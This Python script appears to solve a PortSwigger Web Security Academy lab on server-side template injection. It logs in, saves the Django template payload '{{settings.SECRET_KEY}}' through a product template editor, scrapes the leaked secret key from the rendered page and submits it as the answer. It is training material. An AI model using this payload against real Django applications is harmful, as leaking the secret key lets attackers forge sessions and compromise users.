#!/usr/bin/env python

'''This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
To solve the lab, steal and submit the framework's secret key.
You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r

Lab link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects
'''

import requests
from bs4 import BeautifulSoup
import re


s = requests.session()

lab_id = '0a3700f4042790c481ebf491002a007e' #change based on generated lab

# login as content-manager:C0nt3ntM4n4g3r as provided in the instructions
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 

soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #login csrf token
# Submit this data in next the post request to login
data = { 'username' : "content-manager",
        'password' : "C0nt3ntM4n4g3r",
        'csrf': token
}
r2 = s.post(uri, data=data)

# Once logged in, go to an edit template page
uri = f"https://{lab_id}.web-security-academy.net/product/template?productId=1"
r3 = s.get(uri)

soup = BeautifulSoup(r3.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #template change csrf token

# Template framework is running Django from Python. Steps to find payload
# 1. Add {% debug %} to template and search environment variables
# 2. discover the 'settings' variable. The documentation reveals the presence of a SECRET.KEY properties: https://docs.djangoproject.com/en/4.2/ref/settings/#std-setting-SECRET_KEY
# 3. Send payload {{settings.SECRET_KEY}} to reveal key

# Post our malicous payload
data = { 'csrf': token,
        'template' : 'SECRET_KEY={{settings.SECRET_KEY}}',
        'template-action' : "save"
}
r4 = s.post(uri, data=data)

# Now view the page we just edited and extract the secret key
uri = f"https://{lab_id}.web-security-academy.net/product?productId=1"
r5 = s.get(uri)
match = re.search(r"(SECRET_KEY=)(.*)", r5.text)
key = match.group(2)

# Post the key to the answer page
uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
data = { 'answer' : key }
r6 = s.post(uri, data=data)
if "true" in r6.text:
    print("solved")
else:
    print("nope")
    print(r6.text)